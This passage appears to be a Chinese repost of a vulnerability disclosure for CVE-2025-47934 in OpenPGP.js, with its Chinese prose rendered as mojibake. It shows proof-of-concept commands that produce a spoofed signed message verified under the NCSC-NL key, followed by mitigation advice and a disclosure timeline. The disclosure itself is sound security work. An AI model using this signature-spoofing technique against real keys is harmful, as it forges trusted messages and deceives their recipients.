$Â node validate_signature.js spoofed_message.asc <(gpg --exportÂ -a thomas@codean.io)
Signed message data: malicious
Verified signature by key id d45bb6865e5472ca: Thomas Rinsma <thomas@codean.io>
```

  
  
æ­¤å¤–ï¼Œextract_from_clearsign_and_spoof.pyè¿˜å±•ç¤ºäº†å¦‚ä½•ä»æ˜æ–‡ç­¾åçš„æ¶ˆæ¯ä¸­æå–ç­¾ååŒ…ï¼Œå¹¶ç”±æ­¤ç”Ÿæˆä¼ªé€ æ¶ˆæ¯ã€‚ä»¥ä¸‹æ˜¯è·å…°å›½å®¶ç½‘ç»œå®‰å…¨ä¸­å¿ƒ (NCSC) çš„è¯´æ³•ï¼Œå®Œå…¨åˆæ³•ã€‚ğŸ˜‰  
  

```
# Extract victim's PGP key and a clear-signed message (security.txt in this case)
$ wgetÂ https://www.ncsc.nl/binaries/ncsc/documenten/publicaties/2025/januari/06/pgp-key/pgp.txt
$ wgetÂ https://www.ncsc.nl/.well-known/security.txt
# Generate the spoofed message
$ python extract_from_clearsign_and_spoof.py security.txt > spoofed_message.asc
```

  
  
  

```
$ node validate_signature.js spoofed_message.asc pgp.txt
Signed message data: HelloÂ fromÂ Codean Labs.
Verified signatureÂ byÂ key id cad4ceab247e705f: NCSC-NLÂ 2025Â <cert@ncsc.nl>,NCSC-NLÂ 2025Â general information <info@ncsc.nl>
```

  
  
å‡è½»  
  
è¯·å°†æ‚¨çš„ OpenPGP.js ç‰ˆæœ¬æ›´æ–°è‡³ v5.11.3 æˆ– v6.1.1ï¼Œä»¥ç¼“è§£æ­¤æ¼æ´çš„å½±å“ã€‚å¦‚æœæ‚¨ä½¿ç”¨ Mailvelope æˆ–å…¶ä»–é—´æ¥ä½¿ç”¨ OpenPGP.js çš„è½¯ä»¶ï¼Œä¹Ÿè¯·åŠ¡å¿…æ›´æ–°ã€‚å¦‚æœæ‚¨ç›´æ¥ä½¿ç”¨ OpenPGP.js ä¸”æ— æ³•æ›´æ–°ï¼Œç»´æŠ¤äººå‘˜å‘å¸ƒçš„å…¬å‘Šä¸­ä¹ŸåŒ…å«å…¶ä»–è§£å†³æ–¹æ³•ã€‚  
  
ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼€å‘äººå‘˜å·²ç»å¼€å§‹å®æ–½ä¸¥æ ¼çš„è¯­æ³•éªŒè¯ï¼Œä»¥ç¡®ä¿åƒæˆ‘ä»¬çš„æ¶æ„æ•°æ®åŒ…åˆ—è¡¨è¿™æ ·çš„æ— æ•ˆæ¶ˆæ¯å°½æ—©è¢«æ‹’ç»ã€‚æˆ‘ä»¬è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„æ–¹æ³•ï¼Œå› ä¸ºå®ƒå‡å°‘äº†æ”»å‡»é¢ï¼Œå¹¶ä¸”å¯èƒ½æœ‰åŠ©äºé˜²æ­¢å°†æ¥å†æ¬¡å‡ºç°ç±»ä¼¼é—®é¢˜ã€‚  
  
  
æ—¶é—´çº¿  
- 2025-05-06 â€“ å‘ YesWeHack ä¸Šçš„ OpenPGP.js Bug Bounty è®¡åˆ’æäº¤æŠ¥å‘Š  
  
- 2025-05-12 â€“ æä¾›æ›´å¤šå…³äºæ¶æ„payloadçš„ä¿¡æ¯  
  
- 2025-05-13 â€“ ç»´æŠ¤äººå‘˜ç¡®è®¤å‘ç°ï¼Œå¼€å§‹åè°ƒä¿®å¤  
  
- 2025-05-19 â€“ åˆ†é… CVE-2025-47934ï¼Œå‘å¸ƒå…¬å‘Šå’Œä¿®å¤  
  
- OpenPGP.js v5.11.3 å’Œ v6.1.1 å‘å¸ƒ  
  
- Mailvelope v6.0.1 å‘å¸ƒ  
  
- 2025-06-10 â€“ è¿™ç¯‡åšæ–‡å·²å‘å¸ƒ  
  
  
  
æ„Ÿè°¢æ‚¨æŠ½å‡º  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
æ¥é˜…è¯»æœ¬æ–‡  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**ç‚¹å®ƒï¼Œåˆ†äº«ç‚¹èµåœ¨çœ‹éƒ½åœ¨è¿™é‡Œ**  
  
